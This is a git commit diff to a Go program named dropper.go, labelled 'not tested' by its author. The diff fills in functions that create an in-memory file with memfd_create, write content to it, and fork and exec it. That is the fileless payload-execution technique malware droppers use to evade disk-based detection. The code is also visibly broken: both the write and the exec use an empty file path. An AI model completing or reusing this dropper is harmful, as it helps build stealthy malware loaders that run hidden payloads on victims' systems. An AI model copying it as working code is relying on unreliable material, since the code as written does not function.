a491733499fe1c5ea6a7056d1fd68aa1d7ac99c3
P4ral1ax <braydenjw00@gmail.com>
2022-12-21 18:13:10 -0500

    More additions to Dropper, not tested

--- dropper.go
+++ dropper.go
@@ -2,6 +2,8 @@ package main
 
 import (
 	"fmt"
+	"os"
+	"syscall"
 
 	"golang.org/x/sys/unix"
 )
@@ -11,20 +13,34 @@ func MemfdCreate(name string) int {
 	fmt.Printf("Creating memfd %v", name)
 	fd, err := unix.MemfdCreate(name, 0)
 	if err != nil {
-		fmt.Errorf("MemfdCreate: %v", err)
+		fmt.Printf("MemfdCreate Error: %v", err)
 		unix.Exit(0)
 	}
 	return fd
 }
 
-func WriteToMemfd(fd int, c string) {
-
-	return
+// Write Content
+func WriteToMemfd(fd int, content string) {
+	fmt.Printf("Writing to MemFd Pointer")
+	filepath := ""
+	f, err := os.OpenFile(filepath, os.O_APPEND|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Printf("Error Opening File: %v", err)
+		unix.Exit(0)
+	}
+	_, err = fmt.Fprint(f, content)
+	if err != nil {
+		fmt.Printf("Error Writing to File: %v", err)
+	}
 }
 
 func ExecMemfd() {
-
-	return
+	pid, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
+	if pid == 0 {
+		print("Executing Memfd Pointer")
+		filepath := ""
+		unix.Exec(filepath, nil, os.Environ())
+	}
 }
 
 func main() {
